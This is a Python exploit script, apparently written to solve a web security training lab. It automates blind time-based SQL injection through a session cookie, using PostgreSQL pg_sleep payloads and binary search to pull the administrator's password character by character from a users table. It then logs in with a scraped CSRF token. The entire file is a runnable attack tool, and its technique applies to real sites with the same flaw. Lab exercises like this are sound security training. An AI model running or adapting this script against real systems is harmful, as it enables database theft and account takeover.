import sys
import time
import warnings
from typing import Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.target_cookie: Optional[str] = None
        self.sql_time_delay = 2

    def _send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[Response]:
        """Handles all HTTP communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except RequestException as e:
            print(f"Communication error: {e}")
            return None

    def is_active(self) -> bool:
        """Verify lab availability"""
        print("[*] Phase 1: Cheacking lab availability...")
        res = self._send_request("")
        return res is not None and "academyLabBanner" in res.text

    def identify_vulnerable_cookie(self) -> Optional[str]:
        """Identifies vulnerable cookie"""
        print("[*] Phase 2: Identifying vulnerable cookie...")
        for cookie in self.session.cookies:
            original_value = cookie.value
            payload = f"' || (SELECT CASE WHEN (1=1) THEN pg_sleep({self.sql_time_delay}) ELSE pg_sleep(0) END)  || '"
            cookie.value = f"{original_value}{payload}"

            start = time.perf_counter()
            res = self._send_request("")
            duration = time.perf_counter() - start

            cookie.value = original_value
            # print(f"[+] For {cookie.name}, request took: {duration:.2f}")
            if (
                duration >= self.sql_time_delay * 0.8
                and res is not None
                and res.status_code == 200
            ):
                self.target_cookie = cookie.name
                print(f"[+] Vulnerable cookie: {cookie.name}")
                return cookie.name
        return None

    def check_condition(self, sql_condition: str) -> bool:
        """Checks sql_condition using time delay in response"""
        if not self.target_cookie:
            return False

        for cookie in self.session.cookies:
            if cookie.name == self.target_cookie:
                original_value = cookie.value
                payload = f"' || (SELECT CASE WHEN ({sql_condition}) THEN pg_sleep({self.sql_time_delay}) ELSE pg_sleep(0) END) || '"
                cookie.value = f"{original_value}{payload}"
                s_time = time.perf_counter()
                res = self._send_request("")
                e_time = time.perf_counter()
                duration = e_time - s_time
                cookie.value = original_value
                if (
                    duration >= self.sql_time_delay
                    and res is not None
                    and res.status_code == 200
                ):
                    return True
        return False

    def find_with_binary_search(self, low: int, high: int, subquery: str) -> int:
        """Finds data length and string usign Binary Search"""

        """
        while self.check_condition(f"({subquery}) > {high}"):
            low = high
            high *= 2
        """
        while low + 1 < high:
            mid = (high + low) // 2
            condition = f"({subquery}) > {mid}"
            # print(f"\r[+] Current binary range: [{low}, {high}] -> {mid}", end="", flush=True,)
            if self.check_condition(condition):
                low = mid
            else:
                high = mid
        # print()
        return high

    def get_data_length(self, subquery: str) -> int:
        """Finds the length of data field using Binary Search"""
        return self.find_with_binary_search(1, 50, subquery)

    def get_data_string(self, len: int, subquery: str) -> Optional[str]:
        """Recover the data string using bianry search"""
        extracted_text = ""
        for pos in range(1, len + 1):
            print(f"\r[+] Extracted string: {extracted_text}", end="", flush=True)
            sub_query = subquery.replace("REPLACE", f"{pos}")
            ascii_val = self.find_with_binary_search(32, 126, sub_query)
            extracted_text += chr(ascii_val)
        print()
        return extracted_text

    def exfiltrate_credential(
        self, column_name: str, table_name: str, where_clause: str
    ) -> Optional[str]:
        """Exfiltrates credentials using binary search"""
        print(f"[*] Phase 3: Exfiltrating {column_name} from {table_name}...")
        # Step 1: Identify length
        length_query = f"SELECT LENGTH({column_name}) FROM {table_name} WHERE {where_clause} LIMIT 1"
        password_length = self.get_data_length(length_query)
        print(f"[+] Identified {column_name} length: {password_length}")

        # Step 2: Extract the password
        data_query = f"SELECT ASCII(SUBSTRING({column_name}, REPLACE, 1)) FROM {table_name} WHERE {where_clause} LIMIT 1"
        admin_password = self.get_data_string(password_length, data_query)
        return admin_password

    def authenticate_and_verify(self, username: str, password: str) -> bool:
        """Authenticates anf verifies lab solved status"""
        # Step 1: Extract CSRF token from login page
        res_login = self._send_request("login")
        if res_login is None or res_login.status_code != 200:
            print("[-] Could not load login page!")
            return False

        soup = BeautifulSoup(res_login.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None
        if not csrf_token:
            print("[-] CSRF token not found in login page!")
            return False
        print(f"[+] CSRF Token: {csrf_token}")

        # Step 2: Login
        login_data = {"csrf": csrf_token, "username": username, "password": password}
        self._send_request("login", data=login_data, method="POST")

        # Step 3: Verify
        res = self._send_request("")
        return res is not None and "Congratulation" in res.text

    def solve(self) -> None:
        # Check lab availability
        if not self.is_active():
            print("[-] Lab expired or inactive!")
            return

        # Identify the vulnerable cookie
        if not self.identify_vulnerable_cookie():
            print("[-] No vulnerable cookie found!")
            return

        # Exfiltrate credentials
        admin_pass = self.exfiltrate_credential(
            "password", "users", "username='administrator'"
        )
        if not admin_pass:
            print("[-] Unable to exfiltrate administrator credentials!")
            return

        # login and verify
        if self.authenticate_and_verify("administrator", admin_pass):
            print("[!] SUCCESS: Logged in and lab solved!")
        else:
            print("[-] Lab is not solved!")


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web--security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()
    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
